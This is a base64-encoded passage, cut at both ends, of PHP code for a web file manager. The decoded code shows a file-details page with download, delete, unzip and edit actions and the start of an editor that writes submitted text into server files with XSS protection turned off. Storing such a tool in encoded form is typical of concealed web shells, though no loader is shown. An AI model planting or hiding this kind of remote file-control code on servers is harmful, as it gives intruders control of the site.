ICAgICAgICAgICAgICAgIGlmICghJGZuWydmb2xkZXInXSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0b3RhbF9maWxlcysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHRvdGFsX2NvbXAgKz0gJGZuWydjb21wcmVzc2VkX3NpemUnXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICR0b3RhbF91bmNvbXAgKz0gJGZuWydmaWxlc2l6ZSddOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWdyb3VwLWl0ZW0iPjw/cGhwIGVjaG8gbG5nKCdGaWxlcyBpbiBhcmNoaXZlJykgPz46IDw/cGhwIGVjaG8gJHRvdGFsX2ZpbGVzID8+PC9saT4NCiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWdyb3VwLWl0ZW0iPjw/cGhwIGVjaG8gbG5nKCdUb3RhbCBzaXplJykgPz46IDw/cGhwIGVjaG8gZm1fZ2V0X2ZpbGVzaXplKCR0b3RhbF91bmNvbXApID8+PC9saT4NCiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWdyb3VwLWl0ZW0iPiA8P3BocCBlY2hvIGxuZygnU2l6ZSBpbiBhcmNoaXZlJykgPz46IDw/cGhwIGVjaG8gZm1fZ2V0X2ZpbGVzaXplKCR0b3RhbF9jb21wKSA/PjwvbGk+DQogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibGlzdC1ncm91cC1pdGVtIj48P3BocCBlY2hvIGxuZygnQ29tcHJlc3Npb24nKSA/PjogPD9waHAgZWNobyByb3VuZCgoJHRvdGFsX2NvbXAgLyBtYXgoJHRvdGFsX3VuY29tcCwgMSkpICogMTAwKSA/PiU8L2xpPg0KICAgICAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIC8vIEltYWdlIGluZm8NCiAgICAgICAgICAgICAgICBpZiAoJGlzX2ltYWdlKSB7DQogICAgICAgICAgICAgICAgICAgICRpbWFnZV9zaXplID0gZ2V0aW1hZ2VzaXplKCRmaWxlX3BhdGgpOw0KICAgICAgICAgICAgICAgICAgICBlY2hvICc8bGkgY2xhc3M9Imxpc3QtZ3JvdXAtaXRlbSI+PHN0cm9uZz4nIC4gbG5nKCdJbWFnZSBzaXplJykgLiAnOjwvc3Ryb25nPiAnIC4gKGlzc2V0KCRpbWFnZV9zaXplWzBdKSA/ICRpbWFnZV9zaXplWzBdIDogJzAnKSAuICcgeCAnIC4gKGlzc2V0KCRpbWFnZV9zaXplWzFdKSA/ICRpbWFnZV9zaXplWzFdIDogJzAnKSAuICc8L2xpPic7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIC8vIFRleHQgaW5mbw0KICAgICAgICAgICAgICAgIGlmICgkaXNfdGV4dCkgew0KICAgICAgICAgICAgICAgICAgICAkaXNfdXRmOCA9IGZtX2lzX3V0ZjgoJGNvbnRlbnQpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdpY29udicpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoISRpc191dGY4KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnQgPSBpY29udihGTV9JQ09OVl9JTlBVVF9FTkMsICdVVEYtOC8vSUdOT1JFJywgJGNvbnRlbnQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVjaG8gJzxsaSBjbGFzcz0ibGlzdC1ncm91cC1pdGVtIj48c3Ryb25nPicgLiBsbmcoJ0NoYXJzZXQnKSAuICc6PC9zdHJvbmc+ICcgLiAoJGlzX3V0ZjggPyAndXRmLTgnIDogJzggYml0JykgLiAnPC9saT4nOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICA/Pg0KICAgICAgICAgICAgPC91bD4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJ0bi1ncm91cCBidG4tZ3JvdXAtc20gZmxleC13cmFwIiByb2xlPSJncm91cCI+DQogICAgICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBjbGFzcz0iZC1pbmxpbmUgbWItMCBidG4gYnRuLW91dGxpbmUtcHJpbWFyeSIgYWN0aW9uPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7ZGw9PD9waHAgZWNobyB1cmxlbmNvZGUoJGZpbGUpID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSI8P3BocCBlY2hvICRfU0VTU0lPTlsndG9rZW4nXTsgPz4iPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tbGluayBidG4tc20gdGV4dC1kZWNvcmF0aW9uLW5vbmUgZnctYm9sZCBwLTAiPjxpIGNsYXNzPSJmYSBmYS1jbG91ZC1kb3dubG9hZCI+PC9pPiA8P3BocCBlY2hvIGxuZygnRG93bmxvYWQnKSA/PjwvYnV0dG9uPiAmbmJzcDsNCiAgICAgICAgICAgICAgICA8L2Zvcm0+DQogICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+DQogICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJmdy1ib2xkIGJ0biBidG4tb3V0bGluZS1wcmltYXJ5IiB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0RlbGV0ZScpID8+IiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7ZGVsPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiIgb25jbGljaz0iY29uZmlybURhaWxvZyhldmVudCwgMTIwOSwgJzw/cGhwIGVjaG8gbG5nKCdEZWxldGUnKSAuICcgJyAuIGxuZygnRmlsZScpOyA/PicsJzw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKTsgPz4nLCB0aGlzLmhyZWYpOyI+IDxpIGNsYXNzPSJmYSBmYS10cmFzaCI+PC9pPiBEZWxldGU8L2E+DQogICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgPGEgY2xhc3M9ImZ3LWJvbGQgYnRuIGJ0bi1vdXRsaW5lLXByaW1hcnkiIGhyZWY9Ijw/cGhwIGVjaG8gZm1fZW5jKCRmaWxlX3VybCkgPz4iIHRhcmdldD0iX2JsYW5rIj48aSBjbGFzcz0iZmEgZmEtZXh0ZXJuYWwtbGluay1zcXVhcmUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ09wZW4nKSA/PjwvYT48L2I+DQogICAgICAgICAgICAgICAgPD9waHANCiAgICAgICAgICAgICAgICAvLyBaSVAgYWN0aW9ucw0KICAgICAgICAgICAgICAgIGlmICghRk1fUkVBRE9OTFkgJiYgKCRpc196aXAgfHwgJGlzX2d6aXApICYmICRmaWxlbmFtZXMgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgICAgICR6aXBfbmFtZSA9IHBhdGhpbmZvKCRmaWxlX3BhdGgsIFBBVEhJTkZPX0ZJTEVOQU1FKTsNCiAgICAgICAgICAgICAgICA/Pg0KICAgICAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIGNsYXNzPSJkLWlubGluZSBidG4gYnRuLW91dGxpbmUtcHJpbWFyeSBtYi0wIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iPD9waHAgZWNobyAkX1NFU1NJT05bJ3Rva2VuJ107ID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InVuemlwIiB2YWx1ZT0iPD9waHAgZWNobyB1cmxlbmNvZGUoJGZpbGUpOyA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tbGluayB0ZXh0LWRlY29yYXRpb24tbm9uZSBmdy1ib2xkIHAtMCBib3JkZXItMCIgc3R5bGU9ImZvbnQtc2l6ZTogMTRweDsiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1VuWmlwJykgPz48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIGNsYXNzPSJkLWlubGluZSBidG4gYnRuLW91dGxpbmUtcHJpbWFyeSBtYi0wIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iPD9waHAgZWNobyAkX1NFU1NJT05bJ3Rva2VuJ107ID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InVuemlwIiB2YWx1ZT0iPD9waHAgZWNobyB1cmxlbmNvZGUoJGZpbGUpOyA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2ZvbGRlciIgdmFsdWU9IjEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWxpbmsgdGV4dC1kZWNvcmF0aW9uLW5vbmUgZnctYm9sZCBwLTAiIHN0eWxlPSJmb250LXNpemU6IDE0cHg7IiB0aXRsZT0iVW5aaXAgdG8gPD9waHAgZWNobyBmbV9lbmMoJHppcF9uYW1lKSA/PiI+PGkgY2xhc3M9ImZhIGZhLWNoZWNrLWNpcmNsZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnVW5aaXBUb0ZvbGRlcicpID8+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoJGlzX3RleHQgJiYgIUZNX1JFQURPTkxZKSB7DQogICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImZ3LWJvbGQgYnRuIGJ0bi1vdXRsaW5lLXByaW1hcnkiIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpID8+JmFtcDtlZGl0PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiIgY2xhc3M9ImVkaXQtZmlsZSI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtcGVuY2lsLXNxdWFyZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnRWRpdCcpID8+DQogICAgICAgICAgICAgICAgICAgIDwvYT4NCiAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImZ3LWJvbGQgYnRuIGJ0bi1vdXRsaW5lLXByaW1hcnkiIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpID8+JmFtcDtlZGl0PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiZlbnY9YWNlIg0KICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9ImVkaXQtZmlsZSI+PGkgY2xhc3M9ImZhIGZhLXBlbmNpbC1zcXVhcmUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0FkdmFuY2VkRWRpdG9yJykgPz4NCiAgICAgICAgICAgICAgICAgICAgPC9hPg0KICAgICAgICAgICAgICAgIDw/cGhwIH0gPz4NCiAgICAgICAgICAgICAgICA8YSBjbGFzcz0iZnctYm9sZCBidG4gYnRuLW91dGxpbmUtcHJpbWFyeSIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4iPjxpIGNsYXNzPSJmYSBmYS1jaGV2cm9uLWNpcmNsZS1sZWZ0IGdvLWJhY2siPjwvaT4gPD9waHAgZWNobyBsbmcoJ0JhY2snKSA/PjwvYT4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IG10LTMiPg0KICAgICAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICAgICAgaWYgKCRpc19vbmxpbmVWaWV3ZXIpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRvbmxpbmVfdmlld2VyID09ICdnb29nbGUnKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBlY2hvICc8aWZyYW1lIHNyYz0iaHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vdmlld2VyP2VtYmVkZGVkPXRydWUmaGw9ZW4mdXJsPScgLiBmbV9lbmMoJGZpbGVfdXJsKSAuICciIGZyYW1lYm9yZGVyPSJubyIgc3R5bGU9IndpZHRoOjEwMCU7bWluLWhlaWdodDo0NjBweCI+PC9pZnJhbWU+JzsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgkb25saW5lX3ZpZXdlciA9PSAnbWljcm9zb2Z0Jykgew0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAnPGlmcmFtZSBzcmM9Imh0dHBzOi8vdmlldy5vZmZpY2VhcHBzLmxpdmUuY29tL29wL2VtYmVkLmFzcHg/c3JjPScgLiBmbV9lbmMoJGZpbGVfdXJsKSAuICciIGZyYW1lYm9yZGVyPSJubyIgc3R5bGU9IndpZHRoOjEwMCU7bWluLWhlaWdodDo0NjBweCI+PC9pZnJhbWU+JzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkaXNfemlwKSB7DQogICAgICAgICAgICAgICAgICAgIC8vIFpJUCBjb250ZW50DQogICAgICAgICAgICAgICAgICAgIGlmICgkZmlsZW5hbWVzICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAnPGNvZGUgY2xhc3M9Im1heGhlaWdodCI+JzsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRmaWxlbmFtZXMgYXMgJGZuKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRmblsnZm9sZGVyJ10pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAnPGI+JyAuIGZtX2VuYygkZm5bJ25hbWUnXSkgLiAnPC9iPjxicj4nOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gJGZuWyduYW1lJ10gLiAnICgnIC4gZm1fZ2V0X2ZpbGVzaXplKCRmblsnZmlsZXNpemUnXSkgLiAnKTxicj4nOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gJzwvY29kZT4nOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAnPHA+JyAuIGxuZygnRXJyb3Igd2hpbGUgZmV0Y2hpbmcgYXJjaGl2ZSBpbmZvJykgLiAnPC9wPic7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJGlzX2ltYWdlKSB7DQogICAgICAgICAgICAgICAgICAgIC8vIEltYWdlIGNvbnRlbnQNCiAgICAgICAgICAgICAgICAgICAgaWYgKGluX2FycmF5KCRleHQsIGFycmF5KCdnaWYnLCAnanBnJywgJ2pwZWcnLCAncG5nJywgJ2JtcCcsICdpY28nLCAnc3ZnJywgJ3dlYnAnLCAnYXZpZicpKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAnPHA+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBpZD0icHJldmlldy1pbWctem9vbUNoZWNrIj48bGFiZWwgZm9yPSJwcmV2aWV3LWltZy16b29tQ2hlY2siPjxpbWcgc3JjPSInIC4gZm1fZW5jKCRmaWxlX3VybCkgLiAnIiBhbHQ9ImltYWdlIiBjbGFzcz0icHJldmlldy1pbWciPjwvbGFiZWw+PC9wPic7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJGlzX2F1ZGlvKSB7DQogICAgICAgICAgICAgICAgICAgIC8vIEF1ZGlvIGNvbnRlbnQNCiAgICAgICAgICAgICAgICAgICAgZWNobyAnPHA+PGF1ZGlvIHNyYz0iJyAuIGZtX2VuYygkZmlsZV91cmwpIC4gJyIgY29udHJvbHMgcHJlbG9hZD0ibWV0YWRhdGEiPjwvYXVkaW8+PC9wPic7DQogICAgICAgICAgICAgICAgfSBlbHNlaWYgKCRpc192aWRlbykgew0KICAgICAgICAgICAgICAgICAgICAvLyBWaWRlbyBjb250ZW50DQogICAgICAgICAgICAgICAgICAgIGVjaG8gJzxkaXYgY2xhc3M9InByZXZpZXctdmlkZW8iPjx2aWRlbyBzcmM9IicgLiBmbV9lbmMoJGZpbGVfdXJsKSAuICciIHdpZHRoPSI2NDAiIGhlaWdodD0iMzYwIiBjb250cm9scyBwcmVsb2FkPSJtZXRhZGF0YSI+PC92aWRlbz48L2Rpdj4nOw0KICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkaXNfdGV4dCkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoRk1fVVNFX0hJR0hMSUdIVEpTKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAvLyBoaWdobGlnaHQNCiAgICAgICAgICAgICAgICAgICAgICAgICRobGpzX2NsYXNzZXMgPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnc2h0bWwnID0+ICd4bWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdodGFjY2VzcycgPT4gJ2FwYWNoZScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3BodG1sJyA9PiAncGhwJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbG9jaycgPT4gJ2pzb24nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzdmcnID0+ICd4bWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICRobGpzX2NsYXNzID0gaXNzZXQoJGhsanNfY2xhc3Nlc1skZXh0XSkgPyAnbGFuZy0nIC4gJGhsanNfY2xhc3Nlc1skZXh0XSA6ICdsYW5nLScgLiAkZXh0Ow0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVtcHR5KCRleHQpIHx8IGluX2FycmF5KHN0cnRvbG93ZXIoJGZpbGUpLCBmbV9nZXRfdGV4dF9uYW1lcygpKSB8fCBwcmVnX21hdGNoKCcjXC5taW5cLihjc3N8anMpJCNpJywgJGZpbGUpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGhsanNfY2xhc3MgPSAnbm9oaWdobGlnaHQnOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnQgPSAnPHByZSBjbGFzcz0id2l0aC1obGpzIj48Y29kZSBjbGFzcz0iJyAuICRobGpzX2NsYXNzIC4gJyI+JyAuIGZtX2VuYygkY29udGVudCkgLiAnPC9jb2RlPjwvcHJlPic7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChpbl9hcnJheSgkZXh0LCBhcnJheSgncGhwJywgJ3BocDQnLCAncGhwNScsICdwaHRtbCcsICdwaHBzJykpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAvLyBwaHAgaGlnaGxpZ2h0DQogICAgICAgICAgICAgICAgICAgICAgICAkY29udGVudCA9IGhpZ2hsaWdodF9zdHJpbmcoJGNvbnRlbnQsIHRydWUpOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnQgPSAnPHByZT4nIC4gZm1fZW5jKCRjb250ZW50KSAuICc8L3ByZT4nOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVjaG8gJGNvbnRlbnQ7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgID8+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQo8P3BocA0KICAgIGZtX3Nob3dfZm9vdGVyKCk7DQogICAgZXhpdDsNCn0NCg0KLy8gZmlsZSBlZGl0b3INCmlmIChpc3NldCgkX0dFVFsnZWRpdCddKSAmJiAhRk1fUkVBRE9OTFkpIHsNCiAgICAkZmlsZSA9ICRfR0VUWydlZGl0J107DQogICAgJGZpbGUgPSBmbV9jbGVhbl9wYXRoKCRmaWxlLCBmYWxzZSk7DQogICAgJGZpbGUgPSBzdHJfcmVwbGFjZSgnLycsICcnLCAkZmlsZSk7DQogICAgaWYgKCRmaWxlID09ICcnIHx8ICFpc19maWxlKCRwYXRoIC4gJy8nIC4gJGZpbGUpIHx8ICFmbV9pc19leGNsdWRlX2l0ZW1zKCRmaWxlKSkgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnRmlsZSBub3QgZm91bmQnKSwgJ2Vycm9yJyk7DQogICAgICAgICRGTV9QQVRIID0gRk1fUEFUSDsNCiAgICAgICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KICAgIH0NCiAgICAkZWRpdEZpbGUgPSAnIDogPGk+PGI+JyAuICRmaWxlIC4gJzwvYj48L2k+JzsNCiAgICBoZWFkZXIoJ1gtWFNTLVByb3RlY3Rpb246MCcpOw0KICAgIGZtX3Nob3dfaGVhZGVyKCk7IC8vIEhFQURFUg0KICAgIGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aA0KDQogICAgJGZpbGVfdXJsID0gRk1fUk9PVF9VUkwgLiBmbV9jb252ZXJ0X3dpbigoRk1fUEFUSCAhPSAnJyA/ICcvJyAuIEZNX1BBVEggOiAnJykgLiAnLycgLiAkZmlsZSk7DQogICAgJGZpbGVfcGF0aCA9ICRwYXRoIC4gJy8nIC4gJGZpbGU7DQoNCiAgICAvLyBub3JtYWwgZWRpdGVyDQogICAgJGlzTm9ybWFsRWRpdG9yID0gdHJ1ZTsNCiAgICBpZiAoaXNzZXQoJF9HRVRbJ2VudiddKSkgew0KICAgICAgICBpZiAoJF9HRVRbJ2VudiddID09ICJhY2UiKSB7DQogICAgICAgICAgICAkaXNOb3JtYWxFZGl0b3IgPSBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8vIFNhdmUgRmlsZQ0KICAgIGlmIChpc3NldCgkX1BPU1RbJ3NhdmVkYXRhJ10pKSB7DQogICAgICAgICR3cml0ZWRhdGEgPSAkX1BPU1RbJ3NhdmVkYXRhJ107DQogICAgICAgICRmZCA9IGZvcGVuKCRmaWxlX3BhdGgsICJ3Iik7DQogICAgICAgIEBmd3JpdGUoJGZkLCAkd3JpdGVkYXRhKTsNCiAgICAgICAgZmNsb3NlKCRmZCk7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdGaWxlIFNhdmVkIFN1Y2Nlc3NmdWxseScpKTsNCiAgICB9DQoNCiAgICAkZXh0ID0gc3RydG9sb3dlcihwYXRoaW5mbygkZmlsZV9wYXRoLCBQQVRISU5GT19FWFRFTlNJT04pKTsNCiAgICAkbWltZV90eXBlID0gZm1fZ2V0X21pbWVfdHlwZSgkZmlsZV9wYXRoKTsNCiAgICAkZmlsZXNpemUgPSBmaWxlc2l6ZSgkZmlsZV9wYXRoKTsNCiAgICAkaXNfdGV4dCA9IGZhbHNlOw0KICAgICRjb250ZW50ID0gJyc7IC8vIGZvciB0ZXh0DQoNCiAgICBpZiAoaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X3RleHRfZXh0cygpKSB8fCBzdWJzdHIoJG1pbWVfdHlwZSwgMCwgNCkgPT0gJ3RleHQnIHx8IGluX2FycmF5KCRtaW1lX3R5cGUsIGZtX2dldF90ZXh0X21pbWVzKCkpKSB7DQogICAgICAgICRpc190ZXh0ID0gdHJ1ZTsNCiAgICAgICAgJGNvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZV9wYXRoKTsNCiAgICB9DQoNCj8+DQogICAgPGRpdiBjbGFzcz0icGF0aCI+DQogICAgICAgIDxkaXYgY2xhc3M9InJvdyI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29sLXNtLTUgY29sLWxnLTYgcHQtMSI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYnRuLXRvb2xiYXIiIHJvbGU9InRvb2xiYXIiPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoISRpc05vcm1hbEVkaXRvcikgeyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYnRuLWdyb3VwIGpzLWFjZS10b29sYmFyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGRhdGEtY21kPSJub25lIiBkYXRhLW9wdGlvbj0iZnVsbHNjcmVlbiIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtc2Vjb25kYXJ5IiBpZD0ianMtYWNlLWZ1bGxzY3JlZW4iIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnRnVsbHNjcmVlbicpID8+Ij48aSBjbGFzcz0iZmEgZmEtZXhwYW5kIiB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0Z1bGxzY3JlZW4nKSA/PiI+PC9pPjwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gZGF0YS1jbWQ9ImZpbmQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXNlY29uZGFyeSIgaWQ9ImpzLWFjZS1zZWFyY2giIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnU2VhcmNoJykgPz4iPjxpIGNsYXNzPSJmYSBmYS1zZWFyY2giIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnU2VhcmNoJykgPz4iPjwvaT48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGRhdGEtY21kPSJ1bmRvIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZS1zZWNvbmRhcnkiIGlkPSJqcy1hY2UtdW5kbyIgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdVbmRvJykgPz4iPjxpIGNsYXNzPSJmYSBmYS11bmRvIiB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1VuZG8nKSA/PiI+PC9pPjwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gZGF0YS1jbWQ9InJlZG8iIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXNlY29uZGFyeSIgaWQ9ImpzLWFjZS1yZWRvIiB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1JlZG8nKSA/PiI+PGkgY2xhc3M9ImZhIGZhLXJlcGVhdCIgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdSZWRvJykgPz4iPjwvaT48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGRhdGEtY21kPSJub25lIiBkYXRhLW9wdGlvbj0id3JhcCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtc2Vjb25kYXJ5IiBpZD0ianMtYWNlLXdvcmRXcmFwIiB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1dvcmQgV3JhcCcpID8+Ij48aSBjbGFzcz0iZmEgZmEtdGV4dC13aWR0aCIgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdXb3JkIFdyYXAnKSA/PiI+PC9pPjwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgaWQ9ImpzLWFjZS1tb2RlIiBkYXRhLXR5cGU9Im1vZGUiIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnU2VsZWN0IERvY3VtZW50IFR5cGUnKSA/PiIgY2xhc3M9ImJ0bi1vdXRsaW5lLXNlY29uZGFyeSBib3JkZXItc3RhcnQtMCBkLW5vbmUgZC1tZC1ibG9jayI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24+LS0gPD9waHAgZWNobyBsbmcoJ1NlbGVjdCBNb2RlJykgPz4gLS08L29wdGlvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGlkPSJqcy1hY2UtdGhlbWUiIGRhdGEtdHlwZT0idGhlbWUiIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnU2VsZWN0IFR